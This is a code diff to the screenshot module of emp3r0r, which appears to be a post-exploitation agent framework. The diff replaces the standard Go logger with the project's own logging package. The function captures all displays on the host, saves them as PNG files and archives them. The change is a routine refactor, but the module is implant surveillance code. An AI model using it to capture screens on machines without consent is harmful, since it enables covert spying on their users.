@@ -6,7 +6,7 @@ package modules
 import (
 	"fmt"
 	"image/png"
-	"log"
+	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"os"
 	"strconv"
 	"time"
@@ -22,10 +22,10 @@ func Screenshot() (path string, err error) {
 	var pics []string
 	if n <= 0 {
 		err = fmt.Errorf("%d displays detected, aborting", n)
-		log.Printf("Zero displays: %v", err)
+		logging.Printf("Zero displays: %v", err)
 		return
 	}
-	log.Printf("Taking screenshot of %d displays", n)
+	logging.Printf("Taking screenshot of %d displays", n)
 
 	// get current working directory
 	cwd, err := os.Getwd()
@@ -51,22 +51,22 @@ func Screenshot() (path string, err error) {
 		img, e := screenshot.CaptureRect(bounds)
 		if e != nil {
 			err = e
-			log.Printf("CaptureRect: %v", err)
+			logging.Printf("CaptureRect: %v", err)
 			return
 		}
 		path = fmt.Sprintf("%s-%d_%dx%d.png", timedate, i, bounds.Dx(), bounds.Dy())
 		picfile, e := util.CreateFileAgent(path)
 		if e != nil {
 			err = fmt.Errorf("create %s: %v", path, e)
-			log.Printf("Create picfile: %v", err)
+			logging.Printf("Create picfile: %v", err)
 			return
 		}
-		log.Printf("Taken screenshot %s", strconv.Quote(path))
+		logging.Printf("Taken screenshot %s", strconv.Quote(path))
 		defer picfile.Close()
 		err = png.Encode(picfile, img)
 		if err != nil {
 			err = fmt.Errorf("PNG encode: %v", err)
-			log.Printf("PNG encode: %v", err)
+			logging.Printf("PNG encode: %v", err)
 			return
 		}
 		pics = append(pics, path)
@@ -79,7 +79,7 @@ func Screenshot() (path string, err error) {
 		err = util.TarXZ(screenshotDir, path)
 		if err != nil {
 			err = fmt.Errorf("making archive: %v", err)
-			log.Printf("Making archive: %v", err)
+			logging.Printf("Making archive: %v", err)
 			return
 		}
 	}
